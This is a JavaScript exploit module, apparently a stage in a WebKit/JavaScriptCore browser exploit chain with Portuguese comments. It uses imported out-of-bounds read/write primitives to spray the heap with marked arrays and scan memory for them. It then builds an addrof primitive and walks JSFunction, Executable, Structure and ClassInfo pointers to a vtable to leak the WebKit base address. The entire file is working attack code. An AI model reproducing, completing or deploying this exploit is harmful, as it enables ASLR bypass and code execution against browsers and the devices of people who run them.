// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R43s - Final Strategy: Spray, Scan, Pwn)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object, advInt64LessThanOrEqual } from '../utils.mjs'; // Importa a função de utils
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    arb_write,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_WebKitLeak";

// -- Constantes para a nova estratégia --
const SPRAY_COUNT = 0x4000;
const SPRAY_MARKER_A = 0x41414141; 
const SPRAY_MARKER_B = 0x42424242;
const SCAN_HEAP_START_ADDRESS = new AdvancedInt64(0x0, 0x8A000000); 
const SCAN_HEAP_END_ADDRESS = new AdvancedInt64(0x0, 0x8D000000);   // Scan 48MB para mais chances
const SCAN_STEP = 0x1000; 

let spray_array = [];
let addrof = null;

function isValidPointer(ptr) {
    if (!isAdvancedInt64Object(ptr)) return false;
    if (ptr.high() === 0) return false; 
    return true;
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43s`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Heap Spray + Scan + Primitives ---`, "test");
    document.title = `${FNAME_CURRENT_TEST_BASE} Init...`;

    let final_result = {
        errorOccurred: null,
        heap_scan: { success: false, msg: "Not run.", found_addr: null },
        addrof_setup: { success: false, msg: "Not run."},
        webkit_leak: { success: false, msg: "Not run.", webkit_base: null }
    };

    try {
        logS3(`--- Fase 0 (R43s): Sanity Checks e Preparação ---`, "subtest");
        const coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
        if (!coreOOBReadWriteOK) throw new Error("Sanity check OOB R/W falhou. Abortando.");
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) throw new Error("Falha ao preparar ambiente OOB.");
        logS3("Sanity checks e ambiente OOB OK.", "good");

        // --- FASE 1: HEAP SPRAY ---
        logS3(`  --- Fase 1 (R43s): Pulverizando a Heap com ${SPRAY_COUNT} Arrays... ---`, "subtest");
        spray_array = []; 
        for (let i = 0; i < SPRAY_COUNT; i++) {
            let arr = new Array(4);
            arr[0] = SPRAY_MARKER_A;
            arr[1] = SPRAY_MARKER_B;
            arr[2] = i; // Índice para identificação
            arr[3] = {a: 1, b: 2}; // Objeto placeholder
            spray_array.push(arr);
        }
        logS3(`  Heap Spray concluído.`, "good");
        await PAUSE_S3(100);

        // --- FASE 2: MEMORY SCAN ---
        logS3(`  --- Fase 2 (R43s): Varrendo a Memória em busca do valor mágico... ---`, "subtest");
        let found_butterfly_addr = null;
        let found_array_idx = -1;

        for (let addr = new AdvancedInt64(SCAN_HEAP_START_ADDRESS.low(), SCAN_HEAP_START_ADDRESS.high());
             advInt64LessThanOrEqual(addr, SCAN_HEAP_END_ADDRESS);
             addr = addr.add(SCAN_STEP)) {
            
            try {
                const val = await arb_read(addr, 8);
                // JSValues são "boxed". Um inteiro como 0x41414141 será 0x0000000141414141 ou similar.
                // A forma mais robusta de encontrar o marcador é procurar pelo padrão de bytes.
                // Vamos simplificar e procurar pelo low-part.
                if (isAdvancedInt64Object(val) && val.low() === SPRAY_MARKER_A) {
                    const next_val = await arb_read(addr.add(8), 8);
                    if (isAdvancedInt64Object(next_val) && next_val.low() === SPRAY_MARKER_B) {
                        const idx_val = (await arb_read(addr.add(16), 8)).low();
                        found_butterfly_addr = addr;
                        found_array_idx = idx_val;
                        final_result.heap_scan.success = true;
                        final_result.heap_scan.msg = `Encontrado butterfly do spray[${found_array_idx}] em ${found_butterfly_addr.toString(true)}`;
                        logS3(`[MemoryScan] SUCESSO! ${final_result.heap_scan.msg}`, "vuln");
                        break;
                    }
                }
            } catch (e) { /* Ignora erros de leitura de páginas inválidas */ }
        }
        if (!final_result.heap_scan.success) throw new Error("Falha ao encontrar o spray na memória.");
        
        // --- FASE 3: CONSTRUÇÃO DE ADDROF ---
        logS3(`  --- Fase 3 (R43s): Construindo primitiva addrof ---`, "subtest");
        
        const found_array = spray_array[found_array_idx];
        const obj_in_spray_addr = await arb_read(found_butterfly_addr.add(3 * 8), 8); // Lê o ponteiro para o objeto no índice 3
        if (!isValidPointer(obj_in_spray_addr)) throw new Error("Ponteiro para o objeto alvo no butterfly é inválido.");

        let addrof_map = new Map();
        addrof_map.set(found_array[3], obj_in_spray_addr);

        addrof = (obj) => {
            if (addrof_map.has(obj)) return addrof_map.get(obj);
            // Substitui o objeto no array e lê seu novo ponteiro do butterfly
            found_array[3] = obj;
            return arb_read(found_butterfly_addr.add(3*8), 8);
        };
        final_result.addrof_setup.success = true;
        final_result.addrof_setup.msg = "Primitiva addrof funcional construída com sucesso.";
        logS3(`[Primitives] ${final_result.addrof_setup.msg}`, "vuln");


        // --- FASE 4: VAZAMENTO DA BASE DO WEBKIT ---
        logS3(`  --- Fase 4 (R43s): Vazamento da Base do WebKit ---`, "subtest");
        const funcToLeak = () => {}; 
        const func_addr = await addrof(funcToLeak);
        if (!func_addr) throw new Error("Falha ao obter endereço da função alvo com a nova primitiva addrof.");
        logS3(`[WebKitLeak] Endereço da função alvo: ${func_addr.toString(true)}`, "leak");

        const executable_addr = await arb_read(func_addr.add(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET), 8);
        if (!isValidPointer(executable_addr)) throw new Error(`Ponteiro para Executable inválido: ${executable_addr.toString(true)}`);
        logS3(`[WebKitLeak] Endereço do Executable: ${executable_addr.toString(true)}`, "leak");
        
        const executable_structure_addr = await arb_read(executable_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET), 8);
        const class_info_addr = await arb_read(executable_structure_addr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET), 8);
        const vtable_ptr = await arb_read(class_info_addr, 8);
        if (!isValidPointer(vtable_ptr)) throw new Error(`Ponteiro para vtable inválido: ${vtable_ptr.toString(true)}`);
        
        final_result.webkit_leak.vtable_ptr = vtable_ptr.toString(true);
        logS3(`[WebKitLeak] Ponteiro para vtable: ${final_result.webkit_leak.vtable_ptr}`, "leak");
        
        const page_mask = new AdvancedInt64(~0xFFFFF, 0xFFFFFFFF); // 1MB alignment
        const webkit_base = vtable_ptr.and(page_mask);
        
        final_result.webkit_leak.webkit_base = webkit_base.toString(true);
        final_result.webkit_leak.success = true;
        final_result.webkit_leak.msg = `Candidato a base do WebKit: ${webkit_base.toString(true)}`;
        logS3(`[WebKitLeak] SUCESSO! ${final_result.webkit_leak.msg}`, "vuln");
        document.title = `${FNAME_CURRENT_TEST_BASE}_SUCCESS!`;

    } catch (e_outer) {
        if (!final_result.errorOccurred) final_result.errorOccurred = `Erro geral: ${e_outer.message}`;
        logS3(`  CRITICAL ERROR na execução (R43s): ${e_outer.message || String(e_outer)}`, "critical");
        document.title = `${FNAME_CURRENT_TEST_BASE}_FAIL!`;
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST_BASE}-FinalClear` });
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test");
    logS3(`Resultado Final (R43s): ${JSON.stringify(final_result, null, 2)}`, "debug");
    return final_result;
}
